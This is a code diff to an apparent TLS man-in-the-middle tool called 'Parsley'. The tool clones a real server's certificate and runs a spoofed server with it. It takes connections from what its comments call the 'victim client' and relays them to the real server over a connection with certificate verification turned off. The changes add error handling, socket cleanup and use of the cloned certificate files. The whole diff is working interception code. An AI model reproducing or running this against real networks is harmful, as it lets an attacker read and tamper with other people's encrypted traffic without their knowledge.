@@ -116,7 +116,11 @@ def start( configs ):
 		logging.info ( "[*] Cloning server certificate..." )
 		cert = get_cert_from_endpoint ( configs['server']['ip'] )
 		#cert = _get_cert_from_endpoint ( "www.google.com" )
-		if ( cert != None ): clone_certificate ( cert )
+		if ( cert != None ): 
+			cn = clone_certificate ( cert )
+			a = cn + "_cert.pem"
+			b = cn + "_key.pem"
+			configs.update( {'cert':a,'key':b} )
 
 		spoof_server( configs )
 		# spoof_gateway( configs )
@@ -131,7 +135,7 @@ def start( configs ):
 		raise
 		
 	except Exception as e:# Any other error
-		logging.error ("\n[!] Error in executing program:", exc_info=True )
+		logging.error ("\n[!] Unexpected error in executing program:", exc_info=True )
 		#logging.error (traceback.format_exc())
 		end( configs )
 
@@ -146,7 +150,7 @@ def spoof_server ( configs ):
 		
 		# ssl_version=ssl.PROTOCOL_SSLv23 ssl.PROTOCOL_TLS
 		if ( PORT == 443 ):
-			s = ssl.wrap_socket ( s, server_side = True, keyfile=KEYFILE, certfile=CERTFILE, do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )
+			s = ssl.wrap_socket ( s, server_side = True, keyfile=configs['key'], certfile=configs['cert'], do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )
 			s.listen(CONN)
 		else:
 			s.listen(CONN)
@@ -158,7 +162,7 @@ def spoof_server ( configs ):
 				# server socket, it opens a communication with real server
 				f = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
 				
-				logging.debug("[*] Connecting to server...")
+				logging.debug("\n[*] Connecting to server...")
 				if ( PORT == 443 ):
 					logging.debug("[*] Doing TLS handshake...")
 					f = ssl.wrap_socket ( f, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )
@@ -167,18 +171,15 @@ def spoof_server ( configs ):
 					f.connect (( configs['server']['ip'], PORT))
 				logging.debug("[*] Connection enstablished!")
 
-
 				#c, addr = s.accept()
 				# https://issues.apache.org/jira/browse/THRIFT-4274
 				#c, addr = sslsocket.accept()
 				c = None
-				c, addr = s.accept()
+				c, addr = s.accept() # it can fail when client noticed some problems such SSL certificate errors
 
-				# ok i have a connection with victim client on secure socket c
-				# since victim client is connecting with me i spoofed real server IP so i know the server name, otherwise i spoofed the gateway...
-				# if i spoofed the gw i needed to go deep since routers don't use L4 but only L3 ( IP ), basically i can't create a socket SOCK_STREAM and wrap a ssl to it
-				# since method itself says that only SOCK_STREAM sockets are supported
-				# which means i have finished my tcp and tls handshake with him now he sended me some data to be forwarded to server faking the client requests
+				'''
+				Your certificate contains the same serial number as another certificate issued by the certificate authority. Please get a new certificate containing a unique serial 						number. Error code: SEC_ERROR_REUSED_ISSUER_AND_SERIAL
+				'''
 				logging.debug ("\n[*] Received connection from: {}".format(addr))
 
 				#handle_connection ( c, wrap_f )
@@ -189,35 +190,51 @@ def spoof_server ( configs ):
 				logging.debug ("[*] Closing connection with server...")
 				#wrap_f.close()
 				# If how is SHUT_RD, further receives are disallowed. If how is SHUT_WR, further sends are disallowed. If how is SHUT_RDWR, further sends and receives are disallowed.
+				logging.debug("[!] Closing server connection socket...")
 				f.shutdown( SHUT_RDWR )
 				f.close()
-				c.shutdown( SHUT_RDWR )
-				c.close()
+				if ( c!=None ):
+					logging.debug("[!] Closing accepted client socket...")
+					c.shutdown( SHUT_RDWR ) # error if connection is resetted by client
+					c.close()
 
 			except socket.error as e:
-				# if error is 0 means client closed connection and i only need to relisten and stay cool, failed to accept connection
-				if ( e.errno == 0 ): 
+				# if error is 0 means client closed connection and i only need to relisten and stay cool, failed to accept connection, because 
+				# kerlen is trying to write on non existing file
+				if ( e.errno == 0 ): # self._sslobj.do_handshake() fail ---> client will send warning or error or close connection directly
 					logging.error ("[!] It seems the client closed the connection! ReListening...")
 					#wrap_f.close()
+					logging.debug("[!] Closing connected server socket...")
 					f.shutdown( SHUT_RDWR )
 					f.close()
 					continue
-				else: # could be connect error, socket creation error or error in handle connection or in shutdown close
+				if ( e.errno == 107 ):# f.shutdown( SHUT_RDWR ) ---> OSError: [Errno 107] Transport endpoint is not connected
+					logging.error ("[!] It seems the server closed the connection! ReConnecting..." )
+					if ( c != None ):
+						logging.debug("[!] Closing accepted client socket...")
+						
+						c.close()
+					f.close() # i dont need shutdown
+					continue
+				else: # could be connect to server error, socket creation for server error, error in accept by client, error in shutdowns and close
 					# ssl.SSLError
-					logging.error ("\n[!] Error in accepting secure connection from client or server:", exc_info=True )
+					logging.error ("\n[!] Unexpected socket error! Parsley will close now..:", exc_info=True )
 					#logging.error(traceback.format_exc())
 					# print(sys.exc_info()[0]) # ERROR sys not defined python3
 					#print ( e )
-					logging.error ("Socket error({0}): {1}".format(e.errno, e.strerror))
-					logging.error ( os.strerror( e.errno ) )
+					#logging.error ("Socket error({0}): {1}".format(e.errno, e.strerror))
+					#logging.error ( os.strerror( e.errno ) )
 					end( configs )
 					#s.close() # do i need to close wrapped one?
-					c.shutdown( SHUT_RDWR )
-					c.close()
+					if ( c != None ):
+						logging.debug("[!] Closing accepted client socket...")
+						c.shutdown( SHUT_RDWR )
+						c.close()
+					logging.debug("[!] Closing listening mitm socket...")
 					s.shutdown( SHUT_RDWR )
 					s.close()
 					#sslsocket.close()
-					break
+					break # this will kill parsley
 			except KeyboardInterrupt:
 				#sslsocket.close()
 				#f.shutdown( SHUT_RDWR )
@@ -282,7 +299,7 @@ if __name__ == '__main__' :
 		sys.exit("[!] Program must be runned as root! Exiting...")
 
 	# formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-	logging.basicConfig ( level=logging.INFO, format='%(message)s' )
+	logging.basicConfig ( level=logging.DEBUG, format='%(message)s' )
 	#logger = logging.getLogger( __name__ )
 	#logging.info("tryout")
 
